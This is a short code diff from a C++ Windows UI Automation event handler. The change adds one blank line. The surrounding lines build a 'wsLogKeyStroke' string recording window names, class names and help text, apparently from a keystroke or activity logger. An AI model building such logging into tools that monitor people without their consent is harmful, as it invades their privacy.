@@ -156,6 +156,7 @@ void MyAutomationEventHandler::HandleOther(IUIAutomationElement* pAutomationElem
 			break;
 		}
 
+
 		wsLogKeyStroke += L"\n\tWindow: " + std::wstring(bWindowName);
 		wsLogKeyStroke += L"\n\tClass: " + std::wstring(bClassName);
 		wsLogKeyStroke += L"\n\tHelp: " + std::wstring(vHelp.bstrVal);
